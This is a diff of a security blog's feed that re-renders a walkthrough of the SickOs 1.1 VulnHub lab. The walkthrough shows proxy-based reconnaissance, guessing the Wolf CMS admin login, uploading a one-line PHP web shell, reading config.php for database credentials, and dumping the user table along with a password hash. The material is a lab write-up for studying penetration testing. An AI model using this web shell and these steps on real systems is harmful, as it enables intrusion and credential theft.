@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Sickos | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/sickos/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-12-12T17:38:18+01:00</updated>
+  <updated>2015-12-15T09:17:53+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -21,55 +21,76 @@
     <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
 
 <p>Nmap output:
-{% codeblock %}
-root@kali32:~$ nmap 192.168.80.169
-22/tcp   open   ssh
-3128/tcp open   squid-http
-8080/tcp closed http-proxy
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nmap 192.168.80.169
+</span><span class='line'>22/tcp   open   ssh
+</span><span class='line'>3128/tcp open   squid-http
+</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure></p>
 
 <p>There is an open proxy, we try internal network reconnaissance:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169">http://192.168.80.169</a></p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169">http://192.168.80.169&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>
+</span><span class='line'>BLEHHH!!!
+</span><span class='line'>&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
 
-<h1>
-BLEHHH!!!
-</h1>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ dirb &lt;a href="http://192.168.80.169:80">http://192.168.80.169:80&lt;/a> -p 192.168.80.169:3128
+</span><span class='line'>&hellip;
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/cgi-bin/">http://192.168.80.169:80/cgi-bin/&lt;/a> (CODE:403|SIZE:290)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a> (CODE:200|SIZE:109)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index">http://192.168.80.169:80/index&lt;/a> (CODE:200|SIZE:21)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index.php">http://192.168.80.169:80/index.php&lt;/a> (CODE:200|SIZE:21)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots">http://192.168.80.169:80/robots&lt;/a> (CODE:200|SIZE:45)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a> (CODE:200|SIZE:45)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/server-status">http://192.168.80.169:80/server-status&lt;/a> (CODE:403|SIZE:295)</span></code></pre></td></tr></table></div></figure></p>
 
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a>
+</span><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /
+</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>!/usr/bin/python&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>print &ldquo;I Try to connect things very frequently\n&rdquo;
+</span><span class='line'>print &ldquo;You may want to try my services&rdquo;</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock %}
-root@kali32:~$ dirb <a href="http://192.168.80.169:80">http://192.168.80.169:80</a> -p 192.168.80.169:3128
-&hellip;
-+ <a href="http://192.168.80.169:80/cgi-bin/">http://192.168.80.169:80/cgi-bin/</a> (CODE:403|SIZE:290)
-+ <a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect</a> (CODE:200|SIZE:109)
-+ <a href="http://192.168.80.169:80/index">http://192.168.80.169:80/index</a> (CODE:200|SIZE:21)
-+ <a href="http://192.168.80.169:80/index.php">http://192.168.80.169:80/index.php</a> (CODE:200|SIZE:21)
-+ <a href="http://192.168.80.169:80/robots">http://192.168.80.169:80/robots</a> (CODE:200|SIZE:45)
-+ <a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt</a> (CODE:200|SIZE:45)
-+ <a href="http://192.168.80.169:80/server-status">http://192.168.80.169:80/server-status</a> (CODE:403|SIZE:295)
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt</a>
-User-agent: *
-Disallow: /
-Dissalow: /wolfcms
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect</a></p>
-
-<h1>!/usr/bin/python</h1>
-
-<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
-print &ldquo;You may want to try my services&rdquo;
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169:80/wolfcms/">http://192.168.80.169:80/wolfcms/</a>
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/wolfcms/">http://192.168.80.169:80/wolfcms/&lt;/a></span></code></pre></td></tr></table></div></figure></p>
 
 <p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
 Firefox. After a little googling, we found this
@@ -78,362 +99,587 @@ shell and we can do this manually. To use this technique, we need credentials to
 <a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
 <code>admin/admin</code>, so we upload the file with the following content for RCE:</p>
 
-<p>{% codeblock lang:php %}
-&lt;?php system($_REQUEST[cmd]); ?>
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
 
 <p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la</a>
-total 20
-drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
-drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
--rw-r&ndash;r&ndash; 1 www-data www-data   32 Dec 12 12:29 a.php
-drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
-drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la&lt;/a>
+</span><span class='line'>total 20
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
+</span><span class='line'>drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   32 Dec 12 12:29 a.php
+</span><span class='line'>drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../</a>&rdquo;
-total 52
-drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
-drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
--rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
--rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
--rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
--rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
--rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
-drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
--rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
--rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
-drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
--rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
-drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../&lt;/a>&rdquo;
+</span><span class='line'>total 52
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
+</span><span class='line'>drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
+</span><span class='line'>-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
+</span><span class='line'>-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
+</span><span class='line'>-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
+</span><span class='line'>-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
+</span><span class='line'>-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
+</span><span class='line'>drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
+</span><span class='line'>-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
+</span><span class='line'>-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
+</span><span class='line'>drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
+</span><span class='line'>-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
+</span><span class='line'>drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 <a href="http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp">http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp</a>
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
-tcp        0      0 127.0.0.1:3306          0.0.0.0:<em>               LISTEN      -
-tcp        0      0 0.0.0.0:80              0.0.0.0:</em>               LISTEN      -
-tcp        0      0 0.0.0.0:22              0.0.0.0:<em>               LISTEN      -
-tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
-tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
-tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
-tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
-tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
-tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
-tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
-tcp6       0      0 :::22                   :::</em>                    LISTEN      -
-tcp6       0      0 :::3128                 :::<em>                    LISTEN      -
-tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
-tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
-udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
-udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
-udp        0      0 0.0.0.0:68              0.0.0.0:</em>                           -
-udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
-udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
-udp6       0      0 :::43051
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp">http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp&lt;/a>
+</span><span class='line'>Active Internet connections (servers and established)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;em>               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:80              0.0.0.0:&lt;/em>               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;em>               LISTEN      -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
+</span><span class='line'>tcp6       0      0 :::22                   :::&lt;/em>                    LISTEN      -
+</span><span class='line'>tcp6       0      0 :::3128                 :::&lt;em>                    LISTEN      -
+</span><span class='line'>tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
+</span><span class='line'>tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
+</span><span class='line'>udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
+</span><span class='line'>udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:68              0.0.0.0:&lt;/em>                           -
+</span><span class='line'>udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
+</span><span class='line'>udp6       0      0 :::43051</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Here we found the database user credentials:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php</a>&rdquo;
-&lt;?php</p>
-
-<p>// Database information:
-// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
-// The path can only be absolute path or :memory:
-// For more info look at: www.php.net/pdo</p>
-
-<p>// Database settings:
-define(&lsquo;DB_DSN&rsquo;, &lsquo;mysql:dbname=wolf;host=localhost;port=3306&rsquo;);
-define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
-define(&lsquo;DB_PASS&rsquo;, &lsquo;john@123&rsquo;);
-define(&lsquo;TABLE_PREFIX&rsquo;, &lsquo;&rsquo;);
-&hellip;
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php&lt;/a>&rdquo;
+</span><span class='line'>&lt;?php&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Database information:
+</span><span class='line'>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+</span><span class='line'>// The path can only be absolute path or :memory:
+</span><span class='line'>// For more info look at: www.php.net/pdo&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Database settings:
+</span><span class='line'>define(&lsquo;DB_DSN&rsquo;, &lsquo;mysql:dbname=wolf;host=localhost;port=3306&rsquo;);
+</span><span class='line'>define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
+</span><span class='line'>define(&lsquo;DB_PASS&rsquo;, &lsquo;john@123&rsquo;);
+</span><span class='line'>define(&lsquo;TABLE_PREFIX&rsquo;, &lsquo;&rsquo;);
+</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Examining the MySQL database:</p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status</a>&rdquo;
-mysql -uroot -pjohn@123 -e status</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;
+</span><span class='line'>mysql -uroot -pjohn@123 -e status&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Connection id:          149
+</span><span class='line'>Current database:
+</span><span class='line'>Current user:           root@localhost
+</span><span class='line'>SSL:                    Not in use
+</span><span class='line'>Current pager:          stdout
+</span><span class='line'>Using outfile:          &lsquo;&rsquo;
+</span><span class='line'>Using delimiter:        ;
+</span><span class='line'>Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
+</span><span class='line'>Protocol version:       10
+</span><span class='line'>Connection:             Localhost via UNIX socket
+</span><span class='line'>Server characterset:    latin1
+</span><span class='line'>Db     characterset:    latin1
+</span><span class='line'>Client characterset:    latin1
+</span><span class='line'>Conn.  characterset:    latin1
+</span><span class='line'>UNIX socket:            /var/run/mysqld/mysqld.sock
+</span><span class='line'>Uptime:                 1 hour 1 min 49 sec&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e&lt;/a>'show+databases'&rdquo;
+</span><span class='line'>Database
+</span><span class='line'>information_schema
+</span><span class='line'>mysql
+</span><span class='line'>performance_schema
+</span><span class='line'>wolf</span></code></pre></td></tr></table></div></figure></p>
 
-<h2>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status</a>&rdquo;</h2>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'show+tables'&rdquo;
+</span><span class='line'>Tables_in_wolf
+</span><span class='line'>cron
+</span><span class='line'>layout
+</span><span class='line'>page
+</span><span class='line'>page_part
+</span><span class='line'>page_tag
+</span><span class='line'>permission
+</span><span class='line'>plugin_settings
+</span><span class='line'>role
+</span><span class='line'>role_permission
+</span><span class='line'>secure_token
+</span><span class='line'>setting
+</span><span class='line'>snippet
+</span><span class='line'>tag
+</span><span class='line'>user
+</span><span class='line'>user_role</span></code></pre></td></tr></table></div></figure></p>
 
-<p>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2</p>
-
-<p>Connection id:          149
-Current database:
-Current user:           root@localhost
-SSL:                    Not in use
-Current pager:          stdout
-Using outfile:          &lsquo;&rsquo;
-Using delimiter:        ;
-Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
-Protocol version:       10
-Connection:             Localhost via UNIX socket
-Server characterset:    latin1
-Db     characterset:    latin1
-Client characterset:    latin1
-Conn.  characterset:    latin1
-UNIX socket:            /var/run/mysqld/mysqld.sock
-Uptime:                 1 hour 1 min 49 sec</p>
-
-<p>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713</p>
-
-<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e</a>&#8216;show+databases&#8217;&rdquo;
-Database
-information_schema
-mysql
-performance_schema
-wolf
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e</a>&#8216;show+tables&#8217;&rdquo;
-Tables_in_wolf
-cron
-layout
-page
-page_part
-page_tag
-permission
-plugin_settings
-role
-role_permission
-secure_token
-setting
-snippet
-tag
-user
-user_role
-{% endcodeblock %}</p>
-
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e</a>&#8216;select+*+from+user&#8217;&rdquo;
-id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
-1       Administrator   <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#97;&#100;&#109;&#105;&#x6e;&#x40;&#x79;&#x6f;&#117;&#x72;&#x73;&#105;&#116;&#x65;&#x2e;&#99;&#111;&#x6d;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#x79;&#111;&#117;&#x72;&#115;&#x69;&#116;&#101;&#x2e;&#99;&#111;&#109;</a>      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL
-{% endcodeblock %}</p>
